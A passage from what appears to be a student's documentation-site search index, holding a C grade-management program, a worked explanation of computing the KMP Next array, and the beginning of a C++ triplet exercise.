printf(\"\u672a\u627e\u5230\u5b66\u53f7\u4e3a%s\u7684\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\", studentID);\n    }\n}\n\n// \u6392\u540d\u5b66\u751f\u4fe1\u606f\nvoid rankStudents() {\n    if (head == NULL) {\n        printf(\"\u94fe\u8868\u4e3a\u7a7a\uff0c\u65e0\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\");\n        return;\n    }\n\n    // \u521b\u5efa\u4e00\u4e2a\u4e34\u65f6\u6570\u7ec4\uff0c\u7528\u4e8e\u5b58\u50a8\u5b66\u751f\u4fe1\u606f\n    int length = 0;\n    Student* current = head;\n    while (current != NULL) {\n        length++;\n        current = current-&gt;next;\n    }\n\n    Student** students = (Student**)malloc(sizeof(Student*) * length);\n    if (students == NULL) {\n        printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\uff0c\u7a0b\u5e8f\u610f\u5916\u9000\u51fa\uff01\\a\\n\");\n        exit(1);\n    }\n\n    current = head;\n    for (int i = 0; i &lt; length; i++) {\n        students[i] = current;\n        current = current-&gt;next;\n    }\n\n    // \u4f7f\u7528\u5192\u6ce1\u6392\u5e8f\u5bf9\u5b66\u751f\u4fe1\u606f\u6309\u603b\u6210\u7ee9\u8fdb\u884c\u6392\u5e8f\n    for (int i = 0; i &lt; length - 1; i++) {\n        for (int j = 0; j &lt; length - 1 - i; j++) {\n            if (students[j]-&gt;sum &lt; students[j + 1]-&gt;sum) {\n                Student* temp = students[j];\n                students[j] = students[j + 1];\n                students[j + 1] = temp;\n            }\n        }\n    }\n\n\n    printf(\"\u5b66\u751f\u6210\u7ee9\u6392\u540d\u5982\u4e0b\uff1a\\n\");\n    for (int i = 0; i &lt; length; i++) {\n        printf(\"\\n\");\n        printf(\"\u6392\u540d %d:\\n\", i + 1);\n        printf(\"\u59d3\u540d: %s\\n\", students[i]-&gt;name);\n        printf(\"\u5b66\u53f7: %s\\n\", students[i]-&gt;ID);\n        printf(\"\u6210\u7ee9:\\n\");\n        for (int j = 0; j &lt; 4; j++) {\n            printf(\"    \u79d1\u76ee %d:  %.2f\\n\", j + 1, students[i]-&gt;score[j]);\n        }\n        printf(\"\u603b\u6210\u7ee9: %.2f\\n\", students[i]-&gt;sum);\n        printf(\"--------------------\\n\");\n    }\n\n    free(students);\n}\n\n// \u4fee\u6539\u5b66\u751f\u4fe1\u606f\nvoid modifyStudent() {\n    if (head == NULL) {\n        printf(\"\u94fe\u8868\u4e3a\u7a7a\uff0c\u65e0\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\");\n        return;\n    }\n\n    char studentID[20] = { 0 };\n    printf(\"\u8bf7\u8f93\u5165\u8981\u4fee\u6539\u7684\u5b66\u751f\u5b66\u53f7: \");\n    scanf(\"%s\", studentID);\n\n    Student* current = head;\n\n    // \u904d\u5386\u94fe\u8868\u67e5\u627e\u8981\u4fee\u6539\u7684\u5b66\u751f\u8282\u70b9\n    while (current != NULL &amp;&amp; strcmp(current-&gt;ID, studentID) != 0) {\n        current = current-&gt;next;\n    }\n\n    // \u5982\u679c\u627e\u5230\u4e86\u8981\u4fee\u6539\u7684\u5b66\u751f\u8282\u70b9\n    if (current != NULL) {\n        current-&gt;sum = 0.00;\n\n        printf(\"\\n******************************\\n\");\n        printf(\"*** \u8bf7\u9009\u62e9\u8981\u4fee\u6539\u7684\u5b66\u751f\u4fe1\u606f ***\\n\");\n        printf(\"**                          **\\n\");\n        printf(\"**          1: \u59d3\u540d         **\\n\");\n        printf(\"**          2: \u5b66\u53f7         **\\n\");\n        printf(\"**          3: \u8bfe\u7a0b         **\\n\");\n        printf(\"**          0: \u9000\u51fa         **\\n\");\n        printf(\"**                          **\\n\");\n        printf(\"******************************\\n\\n\");\n\n        int function;\n        scanf(\"%d\", &amp;function);\n        while (function != 0) {\n            switch (function) {\n            case 1: {\n                printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u59d3\u540d: \");\n                scanf(\"%s\", current-&gt;name);\n                printf(\"\u5b66\u751f\u4fe1\u606f\u4fee\u6539\u6210\u529f\uff01\\n\");\n                break;\n            }\n            case 2: {\n                printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u5b66\u53f7: \");\n                scanf(\"%s\", current-&gt;ID);\n                printf(\"\u5b66\u751f\u4fe1\u606f\u4fee\u6539\u6210\u529f\uff01\\n\");\n                break;\n            }\n            case 3: {\n                printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u56db\u95e8\u8bfe\u7a0b\u6210\u7ee9: \");\n                for (int i = 0; i &lt; 4; i++) {\n                    scanf(\"%f\", &amp;(current-&gt;score[i]));\n                    current-&gt;sum += current-&gt;score[i];\n                }\n                printf(\"\u5b66\u751f\u4fe1\u606f\u4fee\u6539\u6210\u529f\uff01\\n\");\n                break;\n            }\n            default: {\n                printf(\"\u8f93\u5165\u9519\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\a\");\n                scanf(\"%d\", &amp;function);\n                break;\n            }\n\n            }\n            printf(\"\\n\u8bf7\u518d\u6b21\u9009\u62e9\u64cd\u4f5c\uff1a\");\n            scanf(\"%d\", &amp;function);\n        }\n\n    }\n    else {\n        printf(\"\u672a\u627e\u5230\u5b66\u53f7\u4e3a%s\u7684\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\", studentID);\n    }\n}\n\n// \u5bfc\u51fa\u5b66\u751f\u4fe1\u606f\u81f3\u6587\u4ef6\nvoid exportToFile() {\n    if (head == NULL) {\n        printf(\"\u94fe\u8868\u4e3a\u7a7a\uff0c\u65e0\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\");\n        return;\n    }\n\n    char filename[50] = { 0 };\n    printf(\"\u8bf7\u8f93\u5165\u5bfc\u51fa\u6587\u4ef6\u7684\u540d\u79f0: \");\n    scanf(\"%s\", filename);\n\n    FILE* file = fopen(filename, \"w\");\n    if (file == NULL) {\n        printf(\"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\uff01\\a\\n\");\n        return;\n    }\n\n    Student* current = head;\n\n    while (current != NULL) {\n        fprintf(file, \"Name: %s\\n\", current-&gt;name);\n        fprintf(file, \"ID: %s\\n\", current-&gt;ID);\n        fprintf(file, \"Score: \");\n        for (int i = 0; i &lt; 4; i++) {\n            fprintf(file, \"%.2f \", current-&gt;score[i]);\n        }\n        fprintf(file, \"\\n\");\n        fprintf(file, \"Sum: %.2f\\n\", current-&gt;sum);\n        fprintf(file, \"\\n\");\n        current = current-&gt;next;\n    }\n\n    fclose(file);\n    printf(\"\u5b66\u751f\u4fe1\u606f\u5df2\u6210\u529f\u5bfc\u51fa\u5230\u6587\u4ef6%s\uff01\\n\", filename);\n}\n\n// \u7531\u6587\u4ef6\u5bfc\u5165\u5b66\u751f\u4fe1\u606f\nvoid readFromFile() {\n    char filename[50] = { 0 };\n    printf(\"\u8bf7\u8f93\u5165\u8981\u5bfc\u5165\u7684\u6587\u4ef6\u540d: \");\n    scanf(\"%s\", filename);\n\n    FILE* file = fopen(filename, \"r\");\n    if (file == NULL) {\n        printf(\"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\uff01\\a\\n\");\n        return;\n    }\n\n    Student* current = NULL;\n    Student* previous = NULL;\n\n    while (1) {\n        Student* newStudent = (Student*)malloc(sizeof(Student));\n        if (newStudent == NULL) {\n            printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\uff0c\u7a0b\u5e8f\u610f\u5916\u9000\u51fa\uff01\\a\\n\");\n            exit(1);\n        }\n\n\n        if (fscanf(file, \"Name: %s\\n\", newStudent-&gt;name) != 1)\n            break;\n\n        count++;\n\n        fscanf(file, \"ID: %s\\n\", newStudent-&gt;ID);\n        fscanf(file, \"Score: \");\n        for (int i = 0; i &lt; 4; i++) {\n            fscanf(file, \"%f\", &amp;newStudent-&gt;score[i]);\n        }\n        fscanf(file, \"\\n\");\n        fscanf(file, \"Sum: %f\\n\", &amp;newStudent-&gt;sum);\n        fscanf(file, \"\\n\");\n        // \u6ce8\u610f\u770b\uff0c\u8fd9\u91cc\u7684fsanf\u548c\u5bfc\u51fa\u6570\u636e\u51fd\u6570\u4e2d\u7684fprintf\u5e76\u4e0d\u662f\u5b8c\u5168\u76f8\u540c\u7684\u3002\n\n\n        newStudent-&gt;next = NULL;\n\n        if (current == NULL) {\n            current = newStudent;\n            head = newStudent;\n        }\n        else {\n            previous-&gt;next = newStudent;\n            current = newStudent;\n        }\n        previous = newStudent;\n    }\n\n    fclose(file);\n    printf(\"\u5b66\u751f\u4fe1\u606f\u5df2\u6210\u529f\u4ece\u6587\u4ef6%s\u5bfc\u5165\uff01\\n\", filename);\n}\n\n// \u663e\u793a\u5b66\u751f\u4fe1\u606f\nvoid displayStudents() {\n    if (head == NULL) {\n        printf(\"\u94fe\u8868\u4e3a\u7a7a\uff0c\u65e0\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\");\n        return;\n    }\n\n    Student* current = head;\n    while (current != NULL) {\n        printf(\"\u5b66\u751f\u59d3\u540d: %s\\n\", current-&gt;name);\n        printf(\"\u5b66\u751f\u5b66\u53f7: %s\\n\", current-&gt;ID);\n        printf(\"\u5b66\u751f\u6210\u7ee9: \");\n        for (int i = 0; i &lt; 4; i++) {\n            printf(\"%.2f \", current-&gt;score[i]);\n        }\n        printf(\"\\n\");\n        printf(\"\u5b66\u751f\u603b\u6210\u7ee9: %.2f\\n\", current-&gt;sum);\n        printf(\"\\n\");\n        current = current-&gt;next;\n    }\n}\n\n// \u91ca\u653e\u94fe\u8868\u5185\u5b58\nvoid freeList() {\n    Student* current = head;\n    while (current != NULL) {\n        Student* temp = current;\n        current = current-&gt;next;\n        free(temp);\n    }\n    head = NULL;\n}\n\nvoid logo() {\n    int time = 5;\n    while (time) {\n        printf(\"                                                                                                      \\n\");\n        printf(\"          JJJJJJJJJJJ     OOOOOOOOO     KKKKKKKKK    KKKKKKKEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   \\n\");\n        printf(\"          J:::::::::J   OO:::::::::OO   K:::::::K    K:::::KE::::::::::::::::::::ER::::::::::::::::R  \\n\");\n        printf(\"          J:::::::::J OO:::::::::::::OO K:::::::K    K:::::KE::::::::::::::::::::ER::::::RRRRRR:::::R \\n\");\n        printf(\"          JJ:::::::JJO:::::::OOO:::::::OK:::::::K   K::::::KEE::::::EEEEEEEEE::::ERR:::::R     R:::::R\\n\");\n        printf(\"            J:::::J  O::::::O   O::::::OKK::::::K  K:::::KKK  E:::::E       EEEEEE  R::::R     R:::::R\\n\");\n        printf(\"            J:::::J  O:::::O     O:::::O  K:::::K K:::::K     E:::::E               R::::R     R:::::R\\n\");\n        printf(\"            J:::::J  O:::::O     O:::::O  K::::::K:::::K      E::::::EEEEEEEEEE     R::::RRRRRR:::::R \\n\");\n        printf(\"            J:::::j  O:::::O     O:::::O  K:::::::::::K       E:::::::::::::::E     R:::::::::::::RR  \\n\");\n        printf(\"            J:::::J  O:::::O     O:::::O  K:::::::::::K       E:::::::::::::::E     R::::RRRRRR:::::R \\n\");\n        printf(\"JJJJJJJ     J:::::J  O:::::O     O:::::O  K::::::K:::::K      E::::::EEEEEEEEEE     R::::R     R:::::R\\n\");\n        printf(\"J:::::J     J:::::J  O:::::O     O:::::O  K:::::K K:::::K     E:::::E               R::::R     R:::::R\\n\");\n        printf(\"J::::::J   J::::::J  O::::::O   O::::::OKK::::::K  K:::::KKK  E:::::E       EEEEEE  R::::R     R:::::R\\n\");\n        printf(\"J:::::::JJJ:::::::J  O:::::::OOO:::::::OK:::::::K   K::::::KEE::::::EEEEEEEE:::::ERR:::::R     R:::::R\\n\");\n        printf(\" JJ:::::::::::::JJ    OO:::::::::::::OO K:::::::K    K:::::KE::::::::::::::::::::ER::::::R     R:::::R\\n\");\n        printf(\"   JJ:::::::::JJ        OO:::::::::OO   K:::::::K    K:::::KE::::::::::::::::::::ER::::::R     R:::::R\\n\");\n        printf(\"     JJJJJJJJJ            OOOOOOOOO     KKKKKKKKK    KKKKKKKEEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR\\n\");\n        printf(\"                                                                                                      \\n\");\n        printf(\"                                                                                                      \\n\");\n\n        //printf(\"\u5012\u8ba1\u65f6 %d \u79d2\uff01\", time--);\n        printf(\"\\033[1;36;41m\u5012\u8ba1\u65f6 %d \u79d2\uff01\\033[m\\n\", time--);\n        Sleep(1000);\n        system(\"cls\");\n    }\n}\n\n\nint main() {\n\n    logo();\n\n    while (1) {\n\n        printf(\"\\n********************************************\\n\");\n        printf(\"************** \u5b66\u751f\u6210\u7ee9\u7ba1\u7406\u7cfb\u7edf ************\\n\");\n        printf(\"**                                        **\\n\");\n        printf(\"**          \\033[1;36;41m\u5f53\u524d\u7cfb\u7edf\u4e2d\u6709 %d \u4efd\u6570\u636e\uff01\\033[m       **\\n\", count);\n        printf(\"**                                        **\\n\");\n        printf(\"**             1: \u63d2\u5165\u5b66\u751f\u4fe1\u606f            **\\n\");\n        printf(\"**             2: \u5220\u9664\u5b66\u751f\u4fe1\u606f            **\\n\");\n        printf(\"**             3: \u67e5\u8be2\u5b66\u751f\u4fe1\u606f            **\\n\");\n        printf(\"**             4: \u663e\u793a\u5b66\u751f\u4fe1\u606f            **\\n\");\n        printf(\"**             5: \u6392\u540d\u5b66\u751f\u4fe1\u606f            **\\n\");\n        printf(\"**             6: \u4fee\u6539\u5b66\u751f\u4fe1\u606f            **\\n\");\n        printf(\"**             7: \u5bfc\u51fa\u4fe1\u606f\u81f3\u6587\u4ef6          **\\n\");\n        printf(\"**             8: \u7531\u6587\u4ef6\u5bfc\u5165\u4fe1\u606f          **\\n\");\n        printf(\"**             9: \u663e\u793a\u5c0f\u7ec4 LOGO           **\\n\");\n        printf(\"**            10: \u9000\u51fa                    **\\n\");\n        printf(\"**                                        **\\n\");\n        printf(\"********************************************\\n\\n\");\n\n        int choice;\n        printf(\"\u8bf7\u9009\u62e9\u64cd\u4f5c\uff1a\");\n        scanf(\"%d\", &amp;choice);\n\n        switch (choice) {\n        case 1:\n            insertStudent();\n            break;\n        case 2:\n            deleteStudent();\n            break;\n        case 3:\n            queryStudent();\n            break;\n        case 4:\n            displayStudents();\n            break;\n        case 5:\n            rankStudents();\n            break;\n        case 6:\n            modifyStudent();\n            break;\n        case 7:\n            exportToFile();\n            break;\n        case 8:\n            readFromFile();\n            break;\n        case 9:\n            system(\"cls\");\n            logo();\n            break;\n        case 10:\n            freeList();  // \u91ca\u653e\u94fe\u8868\u5185\u5b58\n            exit(0);\n\n        default:\n            printf(\"\u65e0\u6548\u7684\u9009\u62e9\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\a\");\n            scanf(\"%d\", &amp;choice);\n            break;\n        }\n\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/","title":"Next\u6570\u7ec4-\u89c2\u5bdf\u6cd5","text":"<p>\u4eca\u5929\u6765\u5b9e\u9a8c\u5ba4\u505a\u6570\u636e\u7ed3\u6784\u7684\u9898\uff0c\u505aKMP\u7684\u65f6\u5019\u5361\u4f4f\u4e86\uff0c\u6211\u8bb0\u5f97\u4ee5\u524d\u674e\u8001\u5e08\u6559\u8fc7\u76f4\u63a5\u89c2\u5bdf\u6cd5\u5199<code>Next</code>\u6570\u7ec4\uff0c\u4f46\u662f\u73b0\u5728\u4e5f\u60f3\u4e0d\u8d77\u6765\u4e86\u3002\u6f58\u8001\u5e08\u4e5f\u6b63\u5de7\u5728\u5b9e\u9a8c\u5ba4\uff0c\u7136\u540e\u770b\u5230\u6211\u5728\u5f04\u8fd9\u4e2a\u5c31\u7ed9\u6211\u8bb2\u4e86\u8bb2\uff0c\u5f88\u662f\u611f\u8c22\u6f58\u8001\u5e08\u5450\u3002</p>"},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#_1","title":"\u7b54\u6848","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#ababaaabab","title":"ababaaabab","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#0112342234","title":"0112342234","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#_2","title":"\u57fa\u672c\u601d\u60f3","text":"<p>\u6c42\u5f53\u524d\u5143\u7d20\u7684<code>Next</code>\u503c\uff0c\u8981\u770b\u5b83\u4e4b\u524d\u7684\u5b50\u4e32\uff0c\u7136\u540e\u524d\u540e\u7f00\u6bd4\u8f83\uff0c\u6700\u5927\u5339\u914d\u7684\u957f\u5ea6\uff0c\u52a0\u4e00</p>"},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#_3","title":"\u5f00\u59cb","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#ababaaabab_1","title":"ababaaabab","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#01","title":"01**********","text":"<p>\u7136\u540e\uff0c\u5c31\u662f\u6c42\u7b2c\u4e09\u4f4d\u201c<code>a</code>\u201d\uff0c\u770b\u5b83\u4e4b\u524d\u7684\u5b50\u4e32<code>ab</code>\uff0c\u524d\u540e\u7f00\u6ca1\u6709\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u662f0\uff0c\u6700\u540e\u52a01\uff0c\u6240\u4ee5\u662f1</p>"},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#ababaaabab_2","title":"ababaaabab","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#011","title":"011*********","text":"<p>\u7136\u540e\uff0c\u5c31\u662f\u6c42\u7b2c\u56db\u4f4d\u201c<code>b</code>\u201d\uff0c\u770b\u5b83\u4e4b\u524d\u7684\u5b50\u4e32<code>aba</code>\uff0c\u524d\u540e\u7f00\u6709\u4e00\u6837\u7684\uff0c<code>a</code>\u548c<code>a</code>\uff0c\u6240\u4ee5\u662f1\uff0c\u6700\u540e\u52a01\uff0c\u6240\u4ee5\u662f2</p>"},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#ababaaabab_3","title":"ababaaabab","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#0112","title":"0112********","text":"<p>\u7136\u540e\uff0c\u5c31\u662f\u6c42\u7b2c\u4e94\u4f4d\u201c<code>a</code>\u201d\uff0c\u770b\u5b83\u4e4b\u524d\u7684\u5b50\u4e32<code>abab</code>\uff0c\u524d\u540e\u7f00\u6709\u4e00\u6837\u7684\uff0c<code>ab</code>\u548c<code>ab</code>\uff0c\u6240\u4ee5\u662f2\uff0c\u6700\u540e\u52a01\uff0c\u6240\u4ee5\u662f3</p>"},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#ababaaabab_4","title":"ababaaabab","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#01123","title":"01123*******","text":"<p>\u7136\u540e\uff0c\u5c31\u662f\u6c42\u7b2c\u516d\u4f4d\u201c<code>a</code>\u201d\uff0c\u770b\u5b83\u4e4b\u524d\u7684\u5b50\u4e32<code>ababa</code>\uff0c\u524d\u540e\u7f00\u6709\u4e00\u6837\u7684\uff0c<code>aba</code>\u548c<code>aba</code>\uff0c\u6240\u4ee5\u662f3\uff0c\u6700\u540e\u52a01\uff0c\u6240\u4ee5\u662f4</p>"},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#ababaaabab_5","title":"ababaaabab","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#011234","title":"011234******","text":""},{"location":"DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/#_4","title":"\u4ee5\u6b64\u7c7b\u63a8\u2026\u2026","text":""},{"location":"DEC/Data-Structure/Triplets/","title":"\u4e09\u5143\u7ec4","text":""},{"location":"DEC/Data-Structure/Triplets/#_2","title":"\u7b2c\u4e00\u79cd\uff1a\u52a8\u6001","text":"C++<pre><code>/*\n    Name:        Triplet.cpp\n    Author:      \u4faf\u9716\u94b0\n    data:        24/03/10 15:23\n    Description: \u4e09\u5143\u7ec4\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\n*/\n\n#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;iostream&gt; \n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define ERROR 0\n#define OK 1\n\nusing namespace std;\n\ntypedef int ElemType;\n\ntypedef struct {\n    ElemType* elem;\n}Triplet;\n\n\n// \u51fd\u6570\u58f0\u660e\nvoid Menu();\n\nvoid destroyTriplet(Triplet&amp; trip);\nvoid displayTriplet(Triplet&amp; trip);\nvoid initTriplet(Triplet&amp; trip, ElemType aa, ElemType bb, ElemType cc);\n\nint getElem(Triplet&amp; trip, int index, ElemType* getValue);\nvoid putElem(Triplet&amp; trip, int index, ElemType putValue);\n\nbool isSameValue(Triplet&amp; trip);\nbool isAscending(Triplet&amp; trip);\nbool isDscending(Triplet&amp; trip);\n\nElemType getMaxElem(Triplet&amp; trip);\nElemType getMinElem(Triplet&amp; trip);\n\nvoid addTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result);\nvoid subTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result);\nvoid multipTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result);\nvoid divTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result);\n\nTriplet Work(Triplet&amp; trip);\nvoid multip(Triplet&amp; trip);\n\n\n\nint main() {\n\n    Triplet trip;\n\n    printf(\"\u8bf7\u5148\u521d\u59cb\u5316\u4e09\u5143\u7ec4\uff0c\u8bf7\u8f93\u5165\u4e09\u4e2a\u503c\uff0c\u7528\u7a7a\u683c\u5206\u9694\uff1a\\n\");\n    ElemType a, b, c;\n    // scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c);\n\n    cin &gt;&gt; a;\n    cin &gt;&gt; b;\n    cin &gt;&gt; c;\n\n    initTriplet(trip, a, b, c);\n\n    Menu();\n\n    int function;\n\n    scanf(\"%d\", &amp;function);\n\n\n    while (function != 0) {\n        switch (function) {\n        case 1: {\n            destroyTriplet(trip);\n            printf(\"\u9500\u6bc1\u6210\u529f\uff01\\n\");\n            break;\n        }\n\n        case 2: {\n            displayTriplet(trip);\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 3: {\n            int index;\n            ElemType getValue;\n            printf(\"\u8bf7\u8f93\u5165\u7d22\u5f15\u503c\uff1a\");\n            scanf(\"%d\", &amp;index);\n\n            getElem(trip, index, &amp;getValue);\n            //printf(\"\u4e09\u5143\u7ec4\u4e2d\u7b2c%d\u4e2a\u5143\u7d20\u4e3a%d\\n\", index, getValue);\n            cout &lt;&lt; \"\u4e09\u5143\u7ec4\u4e2d\u7b2c\" &lt;&lt; index &lt;&lt; \"\u4e2a\u5143\u7d20\u4e3a \" &lt;&lt; getValue &lt;&lt; endl;\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 4: {\n            int index;\n            ElemType putValue;\n\n            printf(\"\u8bf7\u8f93\u5165\u8981\u4fee\u6539\u7684\u5143\u7d20\u7684\u7d22\u5f15\u548c\u503c\uff1a\");\n            // scanf(\"%d %d\", &amp;index, &amp;putValue);\n            cin &gt;&gt; index;\n            cin &gt;&gt; putValue;\n\n            putElem(trip, index, putValue);\n\n            printf(\"\u4fee\u6539\u6210\u529f\uff01\");\n            displayTriplet(trip);\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 5: {\n            if (isSameValue(trip)) {\n                printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20\u662f \u76f8\u540c \u7684\u3002\\n\");\n            }\n            else {\n                if (isAscending(trip)) {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u662f \u5347\u5e8f\u7684\u3002\\n\");\n                }\n                else {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u4e0d\u662f \u5347\u5e8f\u7684\u3002\\n\");\n                }\n            }\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 6: {\n            if (isSameValue(trip)) {\n                printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20\u662f \u76f8\u540c \u7684\u3002\\n\");\n            }\n            else {\n                if (isDscending(trip)) {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u662f \u964d\u5e8f\u7684\u3002\\n\");\n                }\n                else {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u4e0d\u662f \u964d\u5e8f\u7684\u3002\\n\");\n                }\n            }\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 7: {\n            ElemType Max = getMaxElem(trip);\n            printf(\"\u4e09\u5143\u7ec4\u4e2d\u6700\u5927\u7684\u5143\u7d20\u4e3a\uff1a%d\\n\", Max);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 8: {\n            ElemType Min = getMinElem(trip);\n            printf(\"\u4e09\u5143\u7ec4\u4e2d\u6700\u5c0f\u7684\u5143\u7d20\u4e3a\uff1a%d\\n\", Min);\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 9: {\n            Triplet result = Work(trip);\n            displayTriplet(result);\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 10: {\n            multip(trip);\n            displayTriplet(trip);\n\n            printf(\"\\n--------------------------------\\n\");\n            printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff1a\");\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        default: {\n            printf(\"\u8f93\u5165\u7684\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n\n            // Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        }\n    }\n\n    return 0;\n}\n\n\nvoid Menu() {\n    printf(\"**************************************************************\\n\");\n    printf(\"******************** \u8bf7\u9009\u62e9\u4f60\u7684\u64cd\u4f5c **************************\\n\");\n    printf(\"**                                                          **\\n\");\n    printf(\"**       1: DestroyTriplet  \u9500\u6bc1\u4e09\u5143\u7ec4                      **\\n\");\n    printf(\"**       2: displayTriplet  \u6253\u5370\u4e09\u5143\u7ec4                      **\\n\");\n    printf(\"**       3: getElem         \u67e5\u770b\u4e09\u5143\u7ec4\u4e2d\u7684\u7b2cindex\u4e2a\u5143\u7d20     **\\n\");\n    printf(\"**       4: putElem         \u4fee\u6539\u4e09\u5143\u7ec4\u7684\u7b2cindex\u4e2a\u5143\u7d20       **\\n\");\n    printf(\"**       5: isAscending     \u4e09\u4e2a\u5143\u7d20\u662f\u5426\u5347\u5e8f                **\\n\");\n    printf(\"**       6: isDscending     \u4e09\u4e2a\u5143\u7d20\u662f\u5426\u964d\u5e8f                **\\n\");\n    printf(\"**       7: getMaxElem      \u8fd4\u56de\u4e09\u4e2a\u5143\u7d20\u4e2d\u7684\u6700\u5927\u503c          **\\n\");\n    printf(\"**       8: getMinElem      \u8fd4\u56de\u4e09\u4e2a\u5143\u7d20\u4e2d\u7684\u6700\u5c0f\u503c          **\\n\");\n    printf(\"**       9: work            